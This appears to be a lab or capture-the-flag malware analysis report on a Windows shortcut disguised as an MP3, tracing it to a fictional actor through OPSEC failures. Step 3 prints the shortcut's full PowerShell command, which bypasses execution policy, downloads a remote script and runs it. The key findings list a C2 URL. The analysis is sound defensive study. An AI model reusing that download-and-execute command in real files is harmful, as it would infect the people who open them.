# Malware Analysis Report

## Overview
This report outlines the investigation of a malicious file masquerading as a valid MP3. The analysis reveals a targeted attack involving a Windows shortcut (.lnk) that executes a PowerShell command to download and execute a malicious script. The investigation tracks the malicious actor and their OPSEC failures.

---

## Investigation Steps

### Step 1: Verify the File Type of `song.mp3`
**Command Used:**
```bash
file song.mp3
```
**Output:**
```text
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```
Initial inspection indicated that `song.mp3` was a typical MP3 file. However, further investigation revealed inconsistencies.

### Step 2: Check the File Type of `somg.mp3`
**Command Used:**
```bash
file somg.mp3
```
**Output:**
```text
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
```
Analysis revealed that `somg.mp3` was not an MP3 file but a malicious Windows shortcut (.lnk) capable of executing commands. This raised a security red flag.

### Step 3: Analyze the Shortcut with ExifTool
**Command Used:**
```bash
exiftool somg.mp3
```
**Output:**
```text
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```
The shortcut points to `powershell.exe` and executes a PowerShell command that:
1. Disables PowerShell restrictions.
2. Downloads a malicious script (`IS.ps1`) from a remote server.
3. Executes the script to compromise the system.

---

## Malicious Actor Investigation

### PowerShell Script Details
The script contained a signature: **"Created by the one and only M.M."** This led to further investigation on GitHub.

### Searching GitHub for "M.M."
Using the signature as a query, I identified a GitHub repository linked to the attacker. The repository contained a single commit and comments by the attacker, "MM," which revealed their identity as **Mayor Malware.**

### OPSEC Failure
The attacker used the same handle "MM" across platforms, leaving a trail of evidence that allowed attribution.

---

## Key Findings
- **Author of the Song (song.mp3):** Tyler Ramsbey
- **C2 Server URL:** `http://papash3ll.thm/data`
- **Malicious Actor Identified:** Mayor Malware
- **GitHub Repository Details:**
  - Repository linked to "M.M."
  - Number of commits: 1

---

## Conclusion
The malicious actor exploited a Windows shortcut file to execute a PowerShell command and download a malicious script. OPSEC failures, such as the reuse of a distinctive signature and GitHub handle, enabled attribution to **Mayor Malware.** This analysis highlights the importance of vigilance in detecting suspicious files and tracking attackers through their digital footprints.

---

## Recommendations
1. Avoid executing files with suspicious extensions.
2. Use tools like `file` and `exiftool` to analyze files before opening.
3. Monitor GitHub and other platforms for malicious activities.
4. Strengthen PowerShell restrictions to prevent unauthorized script execution.

---

## Tools Used
- **file:** To identify the file type.
- **ExifTool:** To extract metadata from the shortcut file.
- **GitHub Search:** To investigate the attacker’s digital footprint.
